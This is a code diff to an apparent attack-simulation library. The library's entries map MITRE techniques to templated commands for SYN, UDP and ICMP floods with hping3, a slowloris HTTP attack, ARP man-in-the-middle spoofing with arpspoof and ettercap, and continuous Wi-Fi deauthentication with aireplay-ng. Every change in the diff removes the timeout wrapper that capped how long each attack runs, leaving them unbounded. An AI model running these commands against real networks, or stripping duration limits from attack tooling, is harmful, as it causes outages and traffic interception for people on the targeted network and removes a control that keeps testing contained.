@@ -15,7 +15,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1498.001",
         tool="hping3",
         category="dos",
-        command="timeout -k 2 {duration} hping3 -S --flood -p {port} {target}",
+        command="hping3 -S --flood -p {port} {target}",
     ),
     AttackDef(
         name="dos_http",
@@ -27,7 +27,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1499.001",
         tool="slowloris",
         category="dos",
-        command="timeout -k 2 {duration} slowloris {target} -p {port} -s 200 -v",
+        command="slowloris {target} -p {port} -s 200 -v",
         requires_root=False,
     ),
     AttackDef(
@@ -40,7 +40,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1498.001",
         tool="hping3",
         category="dos",
-        command="timeout -k 2 {duration} hping3 --udp --flood -p {port} {target}",
+        command="hping3 --udp --flood -p {port} {target}",
     ),
     AttackDef(
         name="icmp_flood",
@@ -52,7 +52,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1498.001",
         tool="hping3",
         category="dos",
-        command="timeout -k 2 {duration} hping3 --icmp --flood {target}",
+        command="hping3 --icmp --flood {target}",
     ),
 
     AttackDef(
@@ -110,7 +110,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1557.002",
         tool="arpspoof",
         category="mitm",
-        command="timeout -k 2 {duration} arpspoof -i eth0 -t {target} {gateway}",
+        command="arpspoof -i eth0 -t {target} {gateway}",
     ),
     AttackDef(
         name="arp_spoof_ettercap",
@@ -122,7 +122,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1557.002",
         tool="ettercap",
         category="mitm",
-        command="timeout -k 2 {duration} ettercap -T -q -M arp:remote /{target}// /{gateway}//",
+        command="ettercap -T -q -M arp:remote /{target}// /{gateway}//",
     ),
 
     AttackDef(
@@ -185,7 +185,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1498.001",
         tool="hping3",
         category="dos",
-        command="timeout -k 2 {duration} hping3 --flood -p {port} {target}",
+        command="hping3 --flood -p {port} {target}",
     ),
     AttackDef(
         name="ping_flood",
@@ -226,7 +226,7 @@ ATTACK_LIBRARY: list[AttackDef] = [
         mitre_ref="T1498",
         tool="aireplay-ng",
         category="dos",
-        command="timeout -k 2 {duration} aireplay-ng --deauth 0 -a {gateway} -c {target} wlan0mon",
+        command="aireplay-ng --deauth 0 -a {gateway} -c {target} wlan0mon",
     ),
 ]
 
